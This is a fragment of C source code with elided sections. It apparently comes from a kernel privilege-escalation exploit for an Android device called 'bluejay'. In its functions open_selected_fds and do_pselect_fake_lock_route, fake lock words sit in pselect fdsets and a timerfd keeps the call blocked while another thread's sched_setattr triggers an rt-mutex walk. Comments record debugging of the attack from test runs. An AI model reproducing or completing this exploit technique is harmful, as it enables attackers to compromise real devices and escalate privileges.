...
void open_selected_fds(
  ...
  /* Dup the READ end (empty pipe / timerfd, never ready) into every set
   * fd. The out-set payload words would otherwise make the pipe WRITE end
   * instantly "writable-ready", so pselect returns immediately (ret =
   * popcount of the value bits) before the consumer's sched_setattr fires
   * and the rt-mutex walk runs — observed on bluejay as calls=0 step=33.
   * The slide route (which blocks and works) uses the read end; mirror it:
   * with nothing ready the pselect blocks for the full timeout and the
   * consumer fires during the window. */
  (void)write_fd;
...
void do_pselect_fake_lock_route(void) {
  ...
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
    ...
    int pipefd[2];
    SYSCHK(pipe(pipefd));
    /* Block fd must be something that is NEVER poll-ready. A plain pipe
     * read end does NOT work here: the payload words in the fdsets set
     * bits in fd range 0-63 (lock/target words), so open_selected_fds'
     * dup2(read_fd, fd) CLOBBERS the pipe's own write-end fd -> POLLHUP
     * on every set fd -> pselect returns instantly (observed: ret=40
     * calls=0). A timerfd never expires and never HUP's, so nothing is
     * ever ready and pselect blocks for the full window while the
     * consumer fires sched_setattr (same pattern as the proven slide
     * route). */
